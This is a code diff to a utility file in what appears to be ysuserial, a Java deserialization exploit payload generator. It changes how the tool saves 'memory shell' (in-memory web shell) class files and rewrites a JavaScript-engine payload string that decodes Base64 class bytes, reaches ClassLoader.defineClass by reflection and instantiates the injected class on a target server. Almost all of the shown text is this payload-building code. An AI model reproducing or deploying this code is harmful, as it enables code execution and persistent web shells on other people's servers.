@@ -2,7 +2,6 @@ package org.su18.ysuserial.payloads.util;
 
 import javassist.CannotCompileException;
 import javassist.CtClass;
-import javassist.CtMethod;
 import org.apache.bcel.classfile.Utility;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.StringUtils;
@@ -91,9 +90,10 @@ public class Utils {
 		fileOutputStream.close();
 	}
 
-	public static void saveCtClassToFile(CtClass ctClass) throws Exception {
+	public static void saveCtClassToFile(SuCtClass ctClass) throws Exception {
+
 		// 总体在进行类字节码的缩短
-		shrinkBytes(ctClass);
+		shrinkBytes(ctClass.getCtClass());
 		byte[] classBytes = ctClass.toBytecode();
 
 		// 保存内存马文件
@@ -131,7 +131,7 @@ public class Utils {
 		if (USING_RHINO) {
 			return "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"" + generateBCELFormClassBytes(classBytes) + "\").newInstance();";
 		} else {
-			return "var data = \"" + base64Encode(classBytes) + "\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();var method=superLoader.getDeclaredMethod(\"defineClass\",dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();";
+			return "var data = \"" + base64Encode(classBytes) + "\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass(); while (superLoader.getName() != 'java.lang.ClassLoader') { superLoader = superLoader.getSuperclass();};var method=superLoader.getDeclaredMethod(\"defineClass\",dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();";
 		}
 	}
 
